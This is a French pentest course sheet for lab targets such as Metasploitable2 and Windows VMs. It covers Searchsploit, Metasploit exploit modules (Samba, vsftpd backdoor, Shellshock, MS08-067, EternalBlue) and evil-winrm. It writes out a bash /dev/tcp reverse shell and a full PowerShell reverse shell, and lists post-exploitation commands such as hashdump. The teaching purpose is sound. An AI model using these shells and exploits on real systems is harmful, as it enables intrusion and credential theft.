---
cssclasses:
  - max
aliases:
  - "Exploitation SystÃ¨me (Linux & Windows)"
  - "01-16 | Exploitation SystÃ¨me (Linux & Windows)"
  - "System Exploitation (Linux & Windows)"
archetype: cour
module: "GEN (Culture GÃ©nÃ©rale & Hors Cursus)"
tags:
  - pentest
  - attaque/exploitation
  - vulnerabilite
  - outil/metasploit
  - outil/searchsploit
  - outil/netcat
  - outil/nmap
  - outil/nmap/nse
  - langage/python
  - langage/bash
  - os/linux
  - os/windows
  - attaque/reverse-shell
  - meterpreter
  - protocole/smb
  - privileges/elevation
  - exploit-db
---

# 01-16 | Exploitation SystÃ¨me (Linux & Windows)

> [!goal] Objectifs PÃ©dagogiques
> Ã€ la fin de cette fiche, je dois Ãªtre capable de :
> 1. Rechercher un exploit local Ã  partir dâ€™un service vulnÃ©rable.
> 2. Utiliser Searchsploit pour trouver un exploit existant.
> 3. Utiliser Metasploit pour exploitation automatisÃ©e.
> 4. Obtenir un shell (bash, reverse shell, Meterpreter).
> 5. Valider la compromission (whoami, id, uname, etc.).
> 6. PrÃ©parer le terrain pour le module 9 (AD attacks).

## ðŸ“ SynthÃ¨se du Cours

Ce module marque une Ã©tape cruciale dans le processus de *pentesting* : l'**exploitation** des vulnÃ©rabilitÃ©s dÃ©couvertes lors des phases prÃ©cÃ©dentes (reconnaissance, attaques web, SQLI, mots de passe/WI-FI). L'objectif est d'obtenir un accÃ¨s aux systÃ¨mes cibles, qu'ils soient basÃ©s sur **Linux** ou **Windows**.

Les environnements cibles typiques incluent :
*   **Metasploitable2** (distribution Linux dÃ©libÃ©rÃ©ment vulnÃ©rable).
*   **Windows 10** pour les tests.
*   **Windows Server / DC** (prÃ©-Active Directory pour le module 9).
*   **Linux Web** vulnÃ©rable.

Le niveau de ce module varie de dÃ©butant Ã  avancÃ©, et l'attaque principale consiste en l'exploitation de services, l'obtention de shells et l'introduction Ã  l'escalade de privilÃ¨ges.

### 1. Outils Essentiels pour l'Exploitation

Plusieurs outils sont indispensables pour mener Ã  bien les attaques d'exploitation :

| Outil                       | Usage                                       |
| :-------------------------- | :------------------------------------------ |
| **Metasploit Framework**    | Cadre d'exploitation pour exploits, *payloads*, sessions *Meterpreter*. |
| **Searchsploit**            | Recherche d'exploits dans la base de donnÃ©es **Exploit-DB**. |
| **Netcat**                  | Utilitaire rÃ©seau pour des *shells* simples. |
| **nmap NSE**                | Scripts d'exploitation intÃ©grÃ©s Ã  Nmap.     |
| **Python / Bash reverse shells** | CrÃ©ation de connexions inverses manuelles.  |

> [!note] DÃ©finition ClÃ©
> **Exploit** : Un logiciel, une donnÃ©e, une sÃ©quence de commandes ou un *patch* qui tire parti d'un bug ou d'une vulnÃ©rabilitÃ© pour provoquer un comportement inattendu ou imprÃ©vu dans un logiciel, un matÃ©riel ou autre chose.
> **Payload** : Le composant d'un *exploit* qui exÃ©cute l'action malveillante rÃ©elle sur la cible, comme l'ouverture d'un *shell* ou l'installation d'une porte dÃ©robÃ©e.

### 2. Recherche et Identification d'Exploits avec Searchsploit

AprÃ¨s avoir identifiÃ© un service vulnÃ©rable et sa version via des outils comme Nmap, **Searchsploit** est utilisÃ© pour rechercher des *exploits* correspondants dans la base de donnÃ©es **Exploit-DB**.

*   **Rechercher un *exploit*** : `searchsploit [nom_du_service] [version]`
    *   Exemple pour Samba : `searchsploit samba`
    *   Exemple pour VSFTPD : `searchsploit vsftpd 2.3.4`
    *   Exemple pour OpenSSH : `searchsploit openssh 7.2p2`
*   **Afficher le code d'un *exploit*** : `searchsploit -x [chemin_de_l'exploit]`
    *   Exemple : `searchsploit -x linux/remote/12345.c`
*   **Copier un *exploit* dans le rÃ©pertoire courant** : `searchsploit -m [chemin_de_l'exploit]`

L'objectif est d'identifier au moins un *exploit* potentiel sur la cible.

### 3. Exploitation AutomatisÃ©e avec Metasploit Framework

Le **Metasploit Framework** (MSF) est un outil puissant pour dÃ©velopper, tester et exÃ©cuter des *exploits*. Il simplifie le processus d'exploitation grÃ¢ce Ã  ses modules prÃ©dÃ©finis. Pour lancer la console Metasploit, utilisez `msfconsole`.

#### 3.1 Exploitation Linux (Metasploitable2)

*   **Exemple d'exploit Samba (usermap_script)** :
    ```bash
    search samba
    use exploit/multi/samba/usermap_script
    set RHOSTS 192.168.56.20
    set PAYLOAD linux/x86/shell_reverse_tcp
    set LHOST 192.168.56.101
    run
    ```    *RÃ©sultat attendu : Obtention d'un *shell root*.*

*   **Exemple VSFTPD Backdoor** :
    ```bash
    search vsftpd
    use exploit/unix/ftp/vsftpd_234_backdoor
    set RHOSTS 192.168.56.21
    run
    ```

*   **Exemple Shellshock (Apache CGI)** :
    ```bash
    search shellshock
    use exploit/multi/http/apache_mod_cgi_bash_env_exec
    set RHOSTS 192.168.56.22
    run
    ```
    L'objectif est d'obtenir un *shell* (bash ou Meterpreter).

#### 3.2 Exploitation Windows (SMB, EternalBlue, WinRM)

*   **Exploit SMB (ex: MS08-067)** :
    ```bash
    use exploit/windows/smb/ms08_067_netapi
    set RHOSTS 192.168.56.5
    set PAYLOAD windows/meterpreter/reverse_tcp
    set LHOST 192.168.56.101
    run
    ```
    > [!note] DÃ©finition ClÃ©
    > **Meterpreter** : Une charge utile (payload) avancÃ©e de Metasploit qui fournit une interface de ligne de commande interactive avec de nombreuses fonctionnalitÃ©s de post-exploitation, comme la migration de processus, la capture d'Ã©crans ou le *hashdump*.

*   **Exploit SMB (EternalBlue â€“ lab prÃ©configurÃ©)** :
    ```bash
    use exploit/windows/smb/ms17_010_eternalblue
    set RHOSTS 192.168.56.6
    run
    ```

*   **WinRM login puis exÃ©cution (si mots de passe faibles)** :
    Si des identifiants valides ont Ã©tÃ© obtenus (par exemple via Hydra), il est possible de se connecter via WinRM :
    ```bash
    evil-winrm -i 192.168.56.6 -u admin -p Password123
    ```
    L'objectif est d'obtenir une session Meterpreter ou WinRM.

### 4. Obtention de Reverse Shells Manuels

Une **reverse shell** est une connexion oÃ¹ la machine cible initie une connexion vers la machine de l'attaquant. Cela est souvent utile pour contourner les pare-feu qui bloquent les connexions entrantes directes vers la cible.

*   **Linux â€“ Bash Reverse Shell** :
    Sur l'attaquant (listener) :
    ```bash
    nc -lvnp 4444
    ```
    Sur la cible Linux (exÃ©cution) :
    ```bash
    bash -i >& /dev/tcp/192.168.56.101/4444 0>&1
    ```

*   **Windows â€“ Powershell Reverse Shell (lab)** :
    Sur l'attaquant (listener) :
    ```bash
    nc -lvnp 4444
    ```
    Sur la cible Windows (exÃ©cution) :
    ```powershell
    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.56.101',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (IEX $data 2>&1 | Out-String );$sendback2 = ($sendback + 'PS ' + (pwd.Path + '> '));$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
    ```
    L'objectif est d'obtenir une *reverse shell* manuelle.

### 5. VÃ©rifications Post-Exploitation

Une fois un accÃ¨s obtenu, il est crucial d'effectuer des vÃ©rifications pour comprendre l'environnement compromis et identifier les prochaines Ã©tapes possibles.

#### 5.1 VÃ©rifications Linux
*   `id` : Affiche l'identitÃ© de l'utilisateur actuel et ses groupes.
*   `uname -a` : Affiche des informations sur le noyau du systÃ¨me d'exploitation.
*   `sudo -l` : Liste les commandes que l'utilisateur peut exÃ©cuter avec `sudo`.
*   `cat /etc/*release*` : Affiche les informations de version de la distribution Linux.
*   `ls -la /home` : Liste les rÃ©pertoires personnels des utilisateurs.

#### 5.2 VÃ©rifications Windows (via Meterpreter)
*   `sysinfo` : Affiche des informations dÃ©taillÃ©es sur le systÃ¨me.
*   `getuid` : Affiche l'identifiant de l'utilisateur sous lequel la session Meterpreter s'exÃ©cute.
*   `hashdump` : Extrait les hachages de mots de passe du systÃ¨me.
*   `net user` : Liste les utilisateurs du systÃ¨me.
*   `ipconfig` : Affiche la configuration rÃ©seau.
L'objectif est d'identifier l'utilisateur compromis, ses privilÃ¨ges et le systÃ¨me d'exploitation.

### 6. Introduction Ã  la Privilege Escalation (Module 10)

L'**escalade de privilÃ¨ges** (Privilege Escalation) est le processus par lequel un attaquant, ayant obtenu un accÃ¨s initial Ã  un systÃ¨me avec des privilÃ¨ges limitÃ©s, tente d'obtenir un niveau d'accÃ¨s plus Ã©levÃ© (par exemple, *root* sur Linux ou Administrateur sur Windows).

> [!note] DÃ©finition ClÃ©
> **Privilege Escalation** : Le processus d'obtention d'un niveau d'accÃ¨s plus Ã©levÃ© sur un systÃ¨me ou un rÃ©seau que celui qui est initialement accordÃ©, souvent dans le but d'accÃ©der Ã  des donnÃ©es sensibles ou d'exÃ©cuter des actions critiques.

La prÃ©paration Ã  l'escalade de privilÃ¨ges implique la collecte d'informations :
*   Quels utilisateurs existent sur le systÃ¨me ?
*   Quels utilisateurs sont configurÃ©s dans les `sudoers` (Linux) ? (`sudo -l`)
*   Quels services vulnÃ©rables sont en cours d'exÃ©cution ?
*   Quels fichiers exÃ©cutables possÃ¨dent des permissions anormales ou sont exÃ©cutables par `root` ?
*   Quelles sont les permissions des fichiers sensibles ?

Commandes utiles pour la recherche de fichiers SUID/SGID sur Linux :
```bash
find / -perm -4000 2>/dev/null
```
Recherche de fichiers modifiables dans `/etc` :
```bash
find /etc -maxdepth 1 -type f -writable
```

### 7. Fiche d'Exploitation

Il est recommandÃ© de documenter chaque exploitation rÃ©ussie dans une fiche synthÃ©tique :

| IP            | Service vulnÃ©rable | Exploit utilisÃ©  | Shell obtenu    | UID  | Impact | Notes                |
| :------------ | :----------------- | :--------------- | :-------------- | :--- | :----- | :------------------- |
| 192.168.56.20 | Samba              | `usermap_script` | Bash reverse    | root | High   | Linux pivot possible |

### 8. Commandes Essentielles du Module 8

*   **Searchsploit** :
    ```bash
    searchsploit service_name
    searchsploit -x path/to/exploit
    searchsploit -m path/to/exploit
    ```
*   **Metasploit** :
    ```bash
    msfconsole
    search exploit_name
    use exploit/module/path
    set RHOSTS target_ip
    set PAYLOAD payload_type
    set LHOST attacker_ip
    run
    ```
*   **Netcat (Listener)** :
    ```bash
    nc -lvnp PORT
    ```
*   **Reverse Shells** :
    *   **Linux Bash** : `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1`
    *   **Windows PowerShell** : (voir procÃ©dure dÃ©taillÃ©e ci-dessus)

## ðŸ§  Carte Mentale / SchÃ©ma
```mermaid
graph TD
    Start["DÃ©but du Module 8"] --> A["Reconnaissance & VulnÃ©rabilitÃ©s (Modules PrÃ©cÃ©dents)"]
    A --> B["1. Recherche d'Exploits"]
    B -- "Outil: Searchsploit" --> B1["Identifier Exploit Potentiel"]

    B1 --> C["2. Exploitation"]
    C -- "Outil: Metasploit" --> C1["Exploitation Linux (Metasploitable)"]
    C -- "Outil: Metasploit, Evil-WinRM" --> C2["Exploitation Windows (SMB, EternalBlue, WinRM)"]
    C -- "Outil: Netcat, Bash/Powershell" --> C3["Reverse Shells Manuels"]

    C1 --> D["Shell Obtenu"]
    C2 --> D
    C3 --> D

    D --> E["3. VÃ©rifications Post-Exploitation"]
    E -- "Commandes: id, uname, sysinfo, getuid" --> E1["Comprendre l'AccÃ¨s Obtenu"]

    E1 --> F["4. Introduction Ã  la Privilege Escalation"]
    F -- "Objectif: AccÃ¨s Ã‰levÃ©" --> F1["Collecte d'Infos (Utilisateurs, Sudoers, Perms)"]

    F1 --> G["5. Fiche d'Exploitation"]
    G --> End["Fin du Module 8"]```

## â“ Quiz de RÃ©vision (Active Recall)
> [!question] Question 1
> Quel outil est principalement utilisÃ© pour rechercher des *exploits* dans la base de donnÃ©es **Exploit-DB** aprÃ¨s avoir identifiÃ© un service vulnÃ©rable ?
> > [!success]- RÃ©ponse
> > **Searchsploit**.

> [!question] Question 2
> Citez au moins deux types de *shells* que l'on peut obtenir aprÃ¨s une exploitation rÃ©ussie.
> > [!success]- RÃ©ponse
> > Un *shell* **Bash**, un *shell* **Meterpreter**, ou un *shell* **Powershell**.

> [!question] Question 3
> Quel est le but principal de la phase de "vÃ©rifications post-exploitation" ?
> > [!success]- RÃ©ponse
> > Le but principal est de comprendre l'environnement compromis, d'identifier l'utilisateur actuel, ses privilÃ¨ges, le systÃ¨me d'exploitation et les prochaines Ã©tapes potentielles pour l'escalade de privilÃ¨ges ou la persistance.

> [!question] Question 4
> Expliquez briÃ¨vement le concept d'une "*Reverse Shell*" et pourquoi elle est souvent prÃ©fÃ©rÃ©e par les attaquants.
> > [!success]- RÃ©ponse
> > Une *Reverse Shell* est une connexion oÃ¹ la machine cible (compromise) initie une connexion vers la machine de l'attaquant. Elle est prÃ©fÃ©rÃ©e car elle permet souvent de contourner les pare-feu qui bloquent les connexions entrantes directes vers la cible, en exploitant les rÃ¨gles de pare-feu plus permissives pour les connexions sortantes.

> [!question] Question 5
> Donnez un exemple de commande Metasploit pour dÃ©finir l'adresse IP de la cible distante.
> > [!success]- RÃ©ponse
> > `set RHOSTS [adresse_IP_cible]`.